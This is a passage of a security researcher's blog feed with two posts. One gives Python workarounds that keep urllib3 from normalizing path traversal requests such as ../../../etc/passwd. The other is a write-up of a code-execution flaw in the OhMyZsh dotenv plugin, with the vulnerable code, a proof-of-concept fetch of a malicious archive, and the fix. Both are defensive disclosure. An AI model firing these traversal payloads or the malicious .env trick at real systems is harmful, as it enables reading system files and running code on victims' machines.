&lt;p&gt;To conclude, we should never overtake and abuse as a pandemic for solely marketing purposes.&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="thoughts" /><summary type="html"></summary></entry><entry><title type="html">The Path for Testing Path Traversal Vulnerabilities with Python</title><link href="https://mazinahmed.net/blog/testing-for-path-traversal-with-python/" rel="alternate" type="text/html" title="The Path for Testing Path Traversal Vulnerabilities with Python" /><published>2020-04-12T00:00:00-05:00</published><updated>2020-04-12T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/testing-for-path-traversal-with-python</id><content type="html" xml:base="https://mazinahmed.net/blog/testing-for-path-traversal-with-python/">&lt;hr /&gt;

&lt;p&gt;I have noticed an odd behavior in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requests&lt;/code&gt; module in Python, which uses urllib3. I inspected the root cause via regression testing and I found that the root cause of the issue is a change that was introduced in urllib3.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://127.0.0.1/../../../../doing/certain/check&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which should typically send the request to the following path: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/../../../doing/certain/check&lt;/code&gt;. Instead, it’s requesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/doing/certain/check&lt;/code&gt; and modifying the specified input.&lt;/p&gt;

&lt;p&gt;The reason is, dot segments escaping, following RFC3986.&lt;/p&gt;

&lt;p&gt;The change to normalize URIs was introduced in this commit[1] to follow RFC3986[2]. The change is based on the “Remove Dot Segments” at the RFC.&lt;/p&gt;

&lt;p&gt;This breaks a lot of security tools that are performing fuzzing for path traversal vulnerabilities in web-applications.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I have compiled a number of solutions for this issue.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;solutions&quot;&gt;Solutions&lt;/h1&gt;

&lt;h2 id=&quot;option-1-urllibrequest&quot;&gt;Option 1: urllib.request&lt;/h2&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://example.com/../../../etc/passwd&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;option-2-requestsrequest&quot;&gt;Option 2: requests.Request&lt;/h2&gt;

&lt;p&gt;Credit: &lt;a href=&quot;https://twitter.com/buffaloverflow&quot;&gt;Rich Warren&lt;/a&gt; - [3] and [4].&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://example.com/../../../etc/passwd&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://example.com/../../../etc/passwd&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;option-3-using-urllib3httpconnectionpool&quot;&gt;Option 3: Using urllib3.HTTPConnectionPool&lt;/h2&gt;

&lt;p&gt;Credit: &lt;a href=&quot;https://twitter.com/quentinpradet&quot;&gt;Quentin Pradet&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib3&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPConnectionPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/../../../../doing/certain/check&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;option-4-downgrading-urllib3&quot;&gt;Option 4: Downgrading urllib3&lt;/h2&gt;

&lt;p&gt;It’s possible to use previous versions of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requests&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urllib3&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The option for current tools that use requests or urllib3 is to revert to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urllib3==1.24.3&lt;/code&gt;. However, this may not be the best option from an engineering perspective.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;final-additions&quot;&gt;Final Additions&lt;/h1&gt;

&lt;p&gt;I started a discussion on Python Urllib3 Issue tracker on Github: &lt;a href=&quot;https://github.com/urllib3/urllib3/issues/1790&quot;&gt;https://github.com/urllib3/urllib3/issues/1790&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I wanted to thank &lt;a href=&quot;https://twitter.com/sethmlarson&quot;&gt;Seth Michael Larson&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/quentinpradet&quot;&gt;Quentin Pradet&lt;/a&gt;, and &lt;a href=&quot;https://github.com/hodbn&quot;&gt;https://github.com/hodbn&lt;/a&gt;, for all their work on urllib3 and with the Python community!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;Commit to support the removal of dot-segments: &lt;a href=&quot;https://github.com/urllib3/urllib3/commit/5b047b645f5f93900d5e2fc31230848c25eb1f5f&quot;&gt;https://github.com/urllib3/urllib3/commit/5b047b645f5f93900d5e2fc31230848c25eb1f5f&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;RFC3986 - Section 5.2.4 - Remove Dot Segments: &lt;a href=&quot;http://tools.ietf.org/html/rfc3986#section-5.2.4&quot;&gt;http://tools.ietf.org/html/rfc3986#section-5.2.4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/trustedsec/cve-2019-19781/issues/13&quot;&gt;https://github.com/trustedsec/cve-2019-19781/issues/13&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py#L140&quot;&gt;https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py#L140&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="web-security" /><category term="automation" /><summary type="html"></summary></entry><entry><title type="html">OhMyZsh dotenv Remote Code Execution</title><link href="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/" rel="alternate" type="text/html" title="OhMyZsh dotenv Remote Code Execution" /><published>2020-04-08T00:00:00-05:00</published><updated>2020-04-08T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/ohmyzsh-dotenv-rce</id><content type="html" xml:base="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/">&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/91389496-77d3-4dbe-941b-180403841f58.png&quot; alt=&quot;&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;abstract&quot;&gt;Abstract&lt;/h1&gt;

&lt;p&gt;OhMyZsh was vulnerable to an RCE (Remote Code Execution) vulnerability due to arbitrary trusting ENV files at the dotenv plugin. Users who download a malicious repository or a compressed file can have their machines compromised as a result of the vulnerability.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;OhMyZsh&lt;/strong&gt; is a highly popular framework for managing ZSH configuration. It’s an extremely popular project in the open-source community. At the time of writing, it’s ranked in the top 10 Github repositories across all projects.&lt;/p&gt;

&lt;p&gt;I enjoy automating my setup with different configurations to be more productive at work. OhMyZsh helps me automating tasks along with my scripts and dot-files.&lt;/p&gt;

&lt;p&gt;I wanted to automate a specific scenario in my development environment, where I have multiple projects at the same machine, and each project has specific environment variables that need to be loaded before starting development. There is a popular plugin at OhMyZsh that supports this functionality, known as the dotenv plugin.&lt;/p&gt;

&lt;p&gt;According to the documentation:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;[OhMyZsh - dotenv plugin] automatically load your project ENV variables from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file when you &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into project root directory.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Dotenv plugin loads environment variables when the user enters the project directory. It was made public in 2016, and the vulnerability has existed in the plugin for the past 3 years.&lt;/p&gt;

&lt;p&gt;I wanted to review the source-code before running it on my dev machine.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;vulnerable-code&quot;&gt;Vulnerable Code&lt;/h1&gt;

&lt;p&gt;Commit: &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/commit/f960e2be6f01abe5f185d668be661b57051322ac&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/commit/f960e2be6f01abe5f185d668be661b57051322ac&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
source_env&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# test .env syntax&lt;/span&gt;
    zsh &lt;span class=&quot;nt&quot;&gt;-fn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dotenv: error when sourcing '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' file&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;2

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; a &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else
      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; +a
    &lt;span class=&quot;k&quot;&gt;fi
  fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

autoload &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; add-zsh-hook
add-zsh-hook chpwd source_env

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZSH_DOTENV_FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.env
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The method used in the dotenv plugin to set the environment variables makes use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; built-in command.&lt;/p&gt;

&lt;p&gt;Although the command is typically seen when loading environment variables, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; &lt;strong&gt;executes the provided input in Shell&lt;/strong&gt; - (within the same existing shell, that’s why the variables are loaded within the session).&lt;/p&gt;

&lt;p&gt;In our case, whenever a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into a project directory, and that directory has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file, the file is passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt;, to load the variables - and &lt;em&gt;potentially more&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&quot;if-the-user-downloads-a-malicious-repository-or-compressed-file-then-working-with-this-material-leads-to-a-remote-code-execution-when-using-ohmyzsh&quot;&gt;If the user downloads a malicious repository or compressed file, then working with this material leads to a remote code execution when using OhMyZsh.&lt;/h3&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h1&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://github.com/mazen160/public/raw/master/Proof-of-Concepts/ohmyzsh-dotenv-rce/dotenv-poc.zip&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip dotenv-poc.zip
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;dotenv-poc
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root:x:0:0:root:/root:/usr/bin/zsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/603bb5cf-1ff1-450c-9328-a56c96facbfd.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;video&quot;&gt;Video&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/hYkt5wLpzeM&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;

&lt;p&gt;I made a PR to fix the vulnerability at &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/pull/8606&quot;&gt;ohmyzsh - PR #8606&lt;/a&gt;. The simple fix to the issue is to prompt the user to confirm the issuance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; command to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file. It was enhanced and pushed to OhMyZsh master branch now. The update introduces an option for TOFU (Trust on First Use) where trusted paths can be set it be whitelisted. Users can make sure they’re using an updated version to protect against the vulnerability when using the dotenv plugin.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;

&lt;p&gt;It was an interesting session that occurred by coincidence when working on setting up a development environment. The outcome of the session resulted in finding a vulnerability in the ohmyzsh project.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;pr-httpsgithubcomohmyzshohmyzshpull8606&quot;&gt;PR: &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/pull/8606&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/pull/8606&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;First Release commit (2016): &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/commit/8d35fa0e2f32dab6894ca06bfc333af94be97ec7&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/commit/8d35fa0e2f32dab6894ca06bfc333af94be97ec7&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ss64.com/bash/source.html&quot;&gt;https://ss64.com/bash/source.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry></feed>